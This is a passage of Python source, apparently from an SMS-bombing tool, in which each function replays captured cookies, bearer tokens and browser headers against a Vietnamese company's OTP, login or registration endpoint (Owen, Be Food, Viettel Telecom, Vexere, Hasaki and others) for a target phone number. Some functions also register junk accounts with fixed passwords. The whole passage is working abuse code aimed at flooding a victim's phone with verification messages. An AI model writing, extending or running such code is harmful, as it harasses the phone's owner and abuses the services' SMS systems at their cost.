        # 'cookie': 'form_key=mVMv3IDcYvxwDHNH; form_key=mVMv3IDcYvxwDHNH; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; PHPSESSID=d040280e2517e2280569a7db522d5988; mage-messages=; section_data_ids=%7B%22insiderSection%22%3A1721578899%7D; private_content_version=a38eb3ce2c465d1e78c1d0d15bd51ee4',
        'origin': 'https://owen.vn',
        'priority': 'u=1, i',
        'referer': 'https://owen.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobileNumber': sdt,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'mVMv3IDcYvxwDHNH',
    }

    try:
        response = requests.post('https://owen.vn/otp/otp/send', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OWEN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("OWEN | TRẠNG THÁI : THẤT BẠI")

def befood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': sdt_chuyen_doi,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    try:
        response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEFOOD | TRẠNG THÁI : THẤT BẠI")

def foodhubzl():
    cookies = {
        'tick_session': 'f0s3e78s49netpa8583ggjedo5fiabkj',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'tick_session=f0s3e78s49netpa8583ggjedo5fiabkj',
        'Origin': 'https://account.ab-id.net',
        'Referer': 'https://account.ab-id.net/auth/login?token=73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563&destination=https://www.foodhub.vn',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
        'destination': 'https://www.foodhub.vn',
        'site_token': '',
        'phone_number': sdt,
        'remember_account': '1',
        'type': 'zalootp',
        'country': '+84',
        'country_code': 'VN',
    }

    try:
        response = requests.post('https://account.ab-id.net/auth/get_form_phone_code', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODHUBZL ABAHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODHUBZL ABAHA | TRẠNG THÁI : THẤT BẠI")

def heyu():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app-version': '70814',
        'authorization': '8996e28efe64d52bcea12d5165ebae17',
        'content-type': 'application/json',
        'origin': 'https://book.heyu.vn',
        'priority': 'u=1, i',
        'referer': 'https://book.heyu.vn/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'regionName': None,
        'nativeVersion': 2027,
        'reqT': 1721580987444,
    }

    try:
        response = requests.post('https://book.heyu.vn/api/sms/send-code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HEYU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HEYU | TRẠNG THÁI : THẤT BẠI")

def vttelecom():
    cookies = {
        'laravel_session': 'pvF1ChVUx4SoKvqJr0AZsT0MrISq9JKrj3Xz6K8x',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6Inh1dGZLOHBRekpmeXJcL1huTDBHc2t3PT0iLCJ2YWx1ZSI6IjZidWtLendZWWM2bWxjTmVRRU8xZUdid3lIZ1NQeUJVaUVcL3lkZVpSc1pqSEpQU0ZaWERYekYweFA4UzJCWVM0IiwibWFjIjoiMWY3ZjA5OGUxYzZjNmUzYTA1ZTQwM2JkMGZmOTVmMTFiZjA1YWE3MGE3NmQ2ZWVjODE1NDAwMjcxNGU0NjNjZCJ9',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=pvF1ChVUx4SoKvqJr0AZsT0MrISq9JKrj3Xz6K8x; redirectLogin=https://vietteltelecom.vn/dang-ky; XSRF-TOKEN=eyJpdiI6Inh1dGZLOHBRekpmeXJcL1huTDBHc2t3PT0iLCJ2YWx1ZSI6IjZidWtLendZWWM2bWxjTmVRRU8xZUdid3lIZ1NQeUJVaUVcL3lkZVpSc1pqSEpQU0ZaWERYekYweFA4UzJCWVM0IiwibWFjIjoiMWY3ZjA5OGUxYzZjNmUzYTA1ZTQwM2JkMGZmOTVmMTFiZjA1YWE3MGE3NmQ2ZWVjODE1NDAwMjcxNGU0NjNjZCJ9',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-CSRF-TOKEN': 'kCEEt6Zt56F539TFqOWtR0tv386D3EOXzYIIg8K7',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Inh1dGZLOHBRekpmeXJcL1huTDBHc2t3PT0iLCJ2YWx1ZSI6IjZidWtLendZWWM2bWxjTmVRRU8xZUdid3lIZ1NQeUJVaUVcL3lkZVpSc1pqSEpQU0ZaWERYekYweFA4UzJCWVM0IiwibWFjIjoiMWY3ZjA5OGUxYzZjNmUzYTA1ZTQwM2JkMGZmOTVmMTFiZjA1YWE3MGE3NmQ2ZWVjODE1NDAwMjcxNGU0NjNjZCJ9',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://vietteltelecom.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VTTELECOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VTTELECOM | TRẠNG THÁI : THẤT BẠI")

def vinwonders():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'channel': 10,
        'UserName': sdt_chuyen_doi,
        'Type': 1,
        'OtpChannel': 1,
    }

    try:
        response = requests.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINWONDERS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINWONDERS | TRẠNG THÁI : THẤT BẠI")

def vietair():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Referer': 'https://vietair.com.vn/khach-hang-than-quen/dang-ky',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': sdt,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    try:
        response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETAIR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETAIR | TRẠNG THÁI : THẤT BẠI")

def vexere():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOjIsInVzciI6ImZlIiwiY2lkIjoiYTRlYWM1MDAtMzYyNC0xMWU1LWFjOWUtMDkxMjRjNjAxMDEzIiwiZXhwIjoxNzIxNjI0Njc0fQ.7eTAJ_3NCXVZqzRrjJkIzzuyfAygDx2XSQGMxtPRSLY',
        'content-type': 'application/json',
        'origin': 'https://vexere.com',
        'priority': 'u=1, i',
        'referer': 'https://vexere.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
        'lang': 'vi-VN',
    }

    try:
        response = requests.post('https://user-profile-service.vexere.com/v2/auth/send_otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VEXERE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VEXERE | TRẠNG THÁI : THẤT BẠI")

def atadi():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.atadi.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.atadi.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'phone',
        'phone': sdt,
        'lastMessage': 'NEW_MEMBER_UI_2',
    }

    try:
        response = requests.post('https://www.atadi.vn/addon/tds/register2', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ATADI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ATADI | TRẠNG THÁI : THẤT BẠI")

def etrip4u():
    cookies = {
        'language': 'vi',
        'departureCityHolder': 'Ho%2520Chi%2520Minh%2520(SGN)',
        'departureCity': 'SGN',
        'arrivalCityHolder': 'Ha%2520Noi%2520(HAN)',
        'arrivalCity': 'HAN',
        'journeyType': '1',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'language=vi; departureCityHolder=Ho%2520Chi%2520Minh%2520(SGN); departureCity=SGN; arrivalCityHolder=Ha%2520Noi%2520(HAN); arrivalCity=HAN; journeyType=1; G_ENABLED_IDPS=google',
        'origin': 'https://www.etrip4u.com',
        'priority': 'u=1, i',
        'referer': 'https://www.etrip4u.com/Account/MemberRegister',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'Email': '',
        'Phone': sdt,
        'FullName': 'quoc tien huy',
        'Username': sdt,
        'Password': '123123123',
        'ConfirmPassword': '123123123',
    }

    try:
        response = requests.post('https://www.etrip4u.com/Account/MemberRegister', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ETRIP4U | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ETRIP4U | TRẠNG THÁI : THẤT BẠI")

def tinyworld():
    cookies = {
        'connect.sid': 's%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'connect.sid=s%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
        'origin': 'https://prod-tini-id.nkidworks.com',
        'priority': 'u=0, i',
        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com/dia-diem-va-gia-ve.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com/dia-diem-va-gia-ve.html',
        'phone': sdt,
    }

    try:
        response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TINYWORLD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TINYWORLD | TRẠNG THÁI : THẤT BẠI")

def chudu24():
    cookies = {
        'CheckInDate': '23/07/2024',
        'CheckOutDate': '24/07/2024',
        'pt_source': 'adwords',
        'cf_clearance': 'dY0UC1ClhLpZCQWOutmn5LXXs7ZcjxJ9ftSPGGq1z4Q-1721624098-1.0.1.1-v7sKuGxYoHqQtL_l2.oKo6R7MOvSS_q4L4WgtHQ2Fql_RJEC30So2DWrkiLhYnDWQimgC.0aRO69K4jfUI.DMg',
        'connect.sid': 's%3AwCkFVPi1y-Wa-2dlrVmxU6xiY-4igLJ9.aIQ%2B9e1UbkLgFQFKq%2FGmdphr83G30Jhfjn%2FfH%2FcxwlU',
        'timePopup': '297000',
        'openPopupMember': '',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CheckInDate=23/07/2024; CheckOutDate=24/07/2024; pt_source=adwords; cf_clearance=dY0UC1ClhLpZCQWOutmn5LXXs7ZcjxJ9ftSPGGq1z4Q-1721624098-1.0.1.1-v7sKuGxYoHqQtL_l2.oKo6R7MOvSS_q4L4WgtHQ2Fql_RJEC30So2DWrkiLhYnDWQimgC.0aRO69K4jfUI.DMg; connect.sid=s%3AwCkFVPi1y-Wa-2dlrVmxU6xiY-4igLJ9.aIQ%2B9e1UbkLgFQFKq%2FGmdphr83G30Jhfjn%2FfH%2FcxwlU; timePopup=297000; openPopupMember=',
        'origin': 'https://www.chudu24.com',
        'priority': 'u=0, i',
        'referer': 'https://www.chudu24.com/tai-khoan/dang-ky?ReturnUrl=%2F%2Fwww.chudu24.com%2Ftai-khoan%2Fdang-nhap?ReturnUrl=https%3A%2F%2Fwww.chudu24.com%2F%3Fpt_source%3Dadwords%26pt_campaign%3D%26pt_adgroupid%3D8399610561%26pt_device%3Dc%26pt_devicemodel%3D%26gad_source%3D1%26gclid%3DCjwKCAjw4_K0BhBsEiwAfVVZ_yP5YFJ7dq7yi4H5IsJyx3kjbqnH11zNGhZ5UdCQUhvXAP8X5-qcpBoC0ygQAvD_BwE',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_csrf': '',
        'ReturnUrl': '//www.chudu24.com/tai-khoan/dang-nhap?ReturnUrl=https://www.chudu24.com/?pt_source=adwords&pt_campaign=&pt_adgroupid=8399610561&pt_device=c&pt_devicemodel=&gad_source=1&gclid=CjwKCAjw4_K0BhBsEiwAfVVZ_yP5YFJ7dq7yi4H5IsJyx3kjbqnH11zNGhZ5UdCQUhvXAP8X5-qcpBoC0ygQAvD_BwE',
        'typeMember': 'CANHAN',
        'email': sdt,
        'password': '123123',
    }

    try:
        response = requests.post('https://www.chudu24.com/tai-khoan/ajax-dang-ky-web', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CHUDU24 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CHUDU24 | TRẠNG THÁI : THẤT BẠI")
    
def sojo():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Authorization': '',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://sojohotels.com',
        'Referer': 'https://sojohotels.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'lang': 'vi',
    }

    json_data = {
        'phone': sdt,
        'fullName': 'ko co ten',
        'email': 'fasfa@gmail.com',
        'password': '1234',
        'nationalityCode': '+84',
        'nationalityAlphaCode': 'VN',
        'isReceiveMessage': False,
        'isLoyaltyUser': True,
        'isPolicy': True,
        'isSubmit': False,
        'deviceToken': None,
        'osType': 'web',
    }

    try:
        response = requests.post('https://api.sojohotels.com/account/api/v2/user/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SOJO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SOJO | TRẠNG THÁI : THẤT BẠI")

def hasaki():
    cookies = {
        'sessionChecked': '1721624886',
        'HASAKI_SESSID': 'b5a41e810a240f4d2446e6241c78407a',
        'form_key': 'b5a41e810a240f4d2446e6241c78407a',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'ofu3g6vsn92b0iqiu4i28e82s0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'sessionChecked=1721624886; HASAKI_SESSID=b5a41e810a240f4d2446e6241c78407a; form_key=b5a41e810a240f4d2446e6241c78407a; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=ofu3g6vsn92b0iqiu4i28e82s0',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': sdt,
    }

    try:
        response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI.VN | TRẠNG THÁI : THẤT BẠI")

def kiehls():
    cookies = {
        'dwac_a5b49a2c3a0f1f7ca3ef9715a5': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true',
        'cqcid': 'bclcwbad9uTM4EsEYxVq4hk5mq',
        'cquid': '||',
        'sid': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo',
        'dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd': 'bclcwbad9uTM4EsEYxVq4hk5mq',
        '__cq_dnt': '0',
        'dw_dnt': '0',
        'dwsid': '766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==',
        '__cf_bm': 'XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw',
        'cf_clearance': 'oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q',
        'tracking': '%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'dwac_a5b49a2c3a0f1f7ca3ef9715a5=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true; cqcid=bclcwbad9uTM4EsEYxVq4hk5mq; cquid=||; sid=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo; dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd=bclcwbad9uTM4EsEYxVq4hk5mq; __cq_dnt=0; dw_dnt=0; dwsid=766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==; __cf_bm=XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw; cf_clearance=oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q; tracking=%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
        'origin': 'https://www.kiehls.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.kiehls.com.vn/vi_VN/account-login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
